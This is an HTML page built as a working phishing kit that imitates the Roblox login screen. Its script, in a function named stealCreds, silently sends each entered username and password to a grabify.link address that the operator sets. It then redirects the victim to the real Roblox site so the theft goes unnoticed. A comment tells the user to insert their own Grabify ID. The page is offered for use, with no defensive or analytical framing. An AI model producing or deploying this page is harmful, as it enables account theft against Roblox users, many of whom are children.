<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Roblox</title>
    <style>
        /* Reset & Base Styles matching Roblox 2026 */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #ffffff; /* Clean white background */
            font-family: 'Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #393b3d;
        }

        .login-wrapper {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Roblox Logo */
        .logo-container {
            margin-bottom: 24px;
            width: 100%;
            display: flex;
            justify-content: center;
        }

        .roblox-logo {
            height: 50px;
            /* Using a high-res transparent PNG of the modern logo */
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            width: 160px;
        }

        h1 {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 24px;
            color: #393b3d;
            text-align: center;
        }

        /* Form Styles */
        .input-group {
            width: 100%;
            margin-bottom: 16px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 16px 12px;
            border: 1px solid #a3b3c1; /* Light grey border */
            border-radius: 8px; /* Modern rounded corners */
            font-size: 16px;
            background-color: #f2f4f5; /* Very light grey input bg */
            color: #393b3d;
            outline: none;
            transition: border-color 0.2s, background-color 0.2s;
        }

        input:focus {
            border-color: #0074bd; /* Roblox Blue on focus */
            background-color: #ffffff;
            box-shadow: 0 0 0 2px rgba(0, 116, 189, 0.1);
        }

        input::placeholder {
            color: #898989;
        }

        /* The Big Blue Button */
        .btn-login {
            width: 100%;
            padding: 16px;
            background-color: #0074bd; /* Modern Roblox Blue */
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.2s;
        }

        .btn-login:hover {
            background-color: #005a9e; /* Darker blue on hover */
        }

        .btn-login:active {
            transform: scale(0.98);
        }

        /* Spinner for loading state */
        .spinner {
            display: none;
            margin: 15px auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0074bd;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Footer Links (Forgot Password / Sign Up) */
        .footer-links {
            margin-top: 24px;
            text-align: center;
            font-size: 14px;
        }

        .footer-links a {
            color: #0074bd;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Mobile Adjustments */
        @media (max-width: 480px) {
            .login-wrapper {
                padding: 15px;
            }
            .roblox-logo {
                height: 40px;
            }
        }
    </style>
</head>
<body>

<div class="login-wrapper">
    <div class="logo-container">
        <!-- Modern Roblox Logo -->
        <div class="roblox-logo" aria-label="Roblox Logo"></div>
    </div>

    <h1>Log in</h1>

    <form id="loginForm" onsubmit="stealCreds(event)">
        <div class="input-group">
            <input type="text" id="username" name="username" placeholder="Username" required autocomplete="off">
        </div>
        <div class="input-group">
            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
        </div>
        
        <button type="submit" class="btn-login" id="loginBtn">Log In</button>
    </form>

    <div class="spinner" id="spinner"></div>

    <div class="footer-links">
        <a href="#">Forgot Password?</a>
        <span>|</span>
        <a href="#">Sign Up</a>
    </div>
</div>

<script>
    // --- CONFIGURATION ---
    // REPLACE THIS WITH YOUR GRABIFY ID (e.g., "AbCdEfGh")
    const grabifyID = "NOH6OC"; 

    function stealCreds(event) {
        event.preventDefault();
        
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        
        // UI Feedback
        const btn = document.getElementById('loginBtn');
        const spinner = document.getElementById('spinner');
        
        btn.style.display = 'none';
        spinner.style.display = 'block';
        btn.disabled = true;
        
        // 1. Send Data to Grabify
        // We use fetch to send the data silently
        const url = `https://grabify.link/${grabifyID}?user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`;
        
        fetch(url, {
            method: 'GET',
            // Keepalive ensures the request finishes even if we redirect quickly
            keepalive: true
        }).catch(console.error);
            
        // 2. Redirect to Real Roblox after a short delay
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/home";
        }, 800);
    }
</script>

</body>
</html>
